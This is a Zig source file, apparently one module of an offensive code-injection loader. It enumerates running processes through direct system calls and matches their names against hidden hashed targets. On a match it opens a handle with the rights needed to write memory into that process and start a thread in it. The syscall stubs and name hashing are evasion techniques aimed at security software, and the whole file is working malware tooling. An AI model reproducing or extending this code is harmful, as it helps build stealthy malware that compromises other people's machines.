const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Apis = @import("api.zig").Apis;
const Syscalls = @import("syscall.zig").Syscalls;
const win32 = @import("win32.zig");
const hashFNV1aW = @import("helper/hash.zig").hashFNV1aW;
const mem = @import("helper/mem.zig");

pub fn getRemoteProcessHandle(syscalls: Syscalls) !?windows.HANDLE {
    var return_length: windows.ULONG = 0;

    // Get buffer size
    var status = syscalls.NtQuerySystemInformation.?.syscall4(
        @intFromEnum(windows.SYSTEM_INFORMATION_CLASS.SystemProcessInformation),
        0, // null
        0,
        @intFromPtr(&return_length),
    );
    if (return_length == 0) return error.NtQuerySystemInformationFailed;

    const spi_buf = try mem.ntAlloc(syscalls, null, return_length, windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE);
    defer _ = mem.ntFree(syscalls, spi_buf);

    var region_size: usize = return_length;

    status = syscalls.NtQuerySystemInformation.?.syscall4(
        @intFromEnum(windows.SYSTEM_INFORMATION_CLASS.SystemProcessInformation),
        @intFromPtr(spi_buf.ptr), // SYSTEM_PROCESS_INFORMATION (https://ntdoc.m417z.com/system_process_information)
        return_length,
        @intFromPtr(&region_size),
    );
    if (status != win32.STATUS_SUCCESS) {
        return error.NtQuerySystemInformationFailed;
    }

    var spi = @as(*win32.SYSTEM_PROCESS_INFORMATION, @ptrCast(@alignCast(spi_buf.ptr)));


    while (true) {
        if (spi.ImageName.Buffer != null and spi.ImageName.Length != 0) {
            const proc_name_hash = hashFNV1aW(spi.ImageName.Buffer.?, spi.ImageName.Length / 2);
            for (config.target_process_name_hashes) |target_hash| {
                if (proc_name_hash == target_hash) {
                    var h_process: ?windows.HANDLE = null;
                    const desired_access: u32 = win32.PROCESS_CREATE_THREAD | win32.PROCESS_VM_OPERATION | win32.PROCESS_VM_WRITE;
                    var obj_attrs = win32.OBJECT_ATTRIBUTES{
                        .Length = @sizeOf(win32.OBJECT_ATTRIBUTES),
                        .RootDirectory = null,
                        .ObjectName = null,
                        .Attributes = windows.OBJ_CASE_INSENSITIVE, // windows.OBJ_INHERIT,
                        .SecurityDescriptor = null,
                        .SecurityQualityOfService = null,
                    };
                    var client_id = win32.CLIENT_ID{
                        .UniqueProcess = spi.UniqueProcessId,
                        .UniqueThread = null,
                    };
                    status = syscalls.NtOpenProcess.?.syscall4(
                        @intFromPtr(&h_process),
                        @as(usize, desired_access),
                        @intFromPtr(&obj_attrs),
                        @intFromPtr(&client_id),
                    );
                    if (status == win32.STATUS_SUCCESS and h_process != null and h_process != windows.INVALID_HANDLE_VALUE) {
                        return h_process;
                    }
                    _ = mem.ntClose(syscalls, h_process.?);

                    break;
                }
            }
        }

        if (spi.NextEntryOffset == 0) {
            break;
        }

        spi = @as(
            *win32.SYSTEM_PROCESS_INFORMATION,
            @ptrCast(@alignCast(@as([*]u8, @ptrCast(spi)) + spi.NextEntryOffset)),
        );
    }

    return null;
}